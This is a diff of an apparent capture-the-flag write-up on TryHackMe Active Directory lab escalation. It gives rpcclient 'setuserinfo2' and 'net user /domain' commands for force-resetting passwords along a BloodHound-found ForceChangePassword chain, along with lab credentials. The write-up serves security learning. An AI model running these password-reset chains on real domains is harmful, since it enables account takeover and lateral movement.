@@ -69,29 +69,22 @@ Transitive Object Control are objects this user can gain control of by performin
 ### Changing  and resetting passwords
 In bloodhound, if you right click on one of the arrows that contains the `rights` you have on other users, you get a help section that contains techniques you could use to take advantage of those rights :
 
-![[Diagram.svg]]
+#### Changing `SHAWNA_BRAY's` password using `TABATHA_BRITT's` credentials
 
-You got a command you can use to change the password of other users.
-```
-rpcclient -U thm.corp/TABATHA_BRITT%'marlboro(1985)' <MACHINE IP>
+`xfreerdp /u:TABATHA_BRITT /p:'marlboro(1985)' /v:<MACHINE IP\> /dynamic-resolution`
 
-```
+Open a command cmd.exe an run the following to change the TABATHA_BRITT's password:
 
-#### Resetting the password of `SHAWNA_BRAY` using `TABATHA_BRITT`'s credentials
-
-`rpcclient -U thm.corp/TABATHA_BRITT%'marlboro(1985)' 10.10.25.62``
-rpcclient $> `setuserinfo2 SHAWNA_BRAY 23 Password@4444`
-rpcclient $> `exit`
+`net user SHAWNA_BRAY Password@4444 /domain`
 
 Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
-	
-	![[Screenshot from 2024-08-15 20-18-54.png]]
 
+![[Screenshot from 2024-08-15 20-18-54.png]]
 #### SHAWNA_BRAY\@THM.CORP -> ForceChangePassword -> CRUZZ_HALL\@THM.CORP
 
 The **ForceChangePassword** permission allows us (in this case SHAWNA_BRAY\@THM.CORP) to reset a user's password without knowing their current password. So this user can reset CRUZZ_HALL\@THM.CORP's password.
 
-`rpcclient -U thm.corp/SHAWNA_BRAY%'Password@4444' 10.10.25.62`
+`rpcclient -U thm.corp/SHAWNA_BRAY%'Password@4444' <MACHINE IP>`
 
 rpcclient $> `setuserinfo2 CRUZ_HALL 23 Password@4444`                           rpcclient $> `exit`   
 
@@ -103,4 +96,13 @@ Confirm that the changes were successful  choosing Execution rights->First degre
 
 Same as above, this time CRUZZ_HALL\@THM.CORP can reset DARLA_WINTERS\@THM.CORP's password.
 
-`rpcclient -U thm.corp/CRUZZ_HALL%'Password@2038' 10.10.25.62`
+`rpcclient -U thm.corp/CRUZZ_HALL%'Password@4444' <MACHINE IP>`
+
+rpcclient $> `setuserinfo2 DARLA_WINTERS 23 Password@4444`                       rpcclient $> `exit`  
+
+Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
+
+![[Screenshot from 2024-08-18 12-49-59.png]]
+
+**Next step:** [[Delegation]]
+
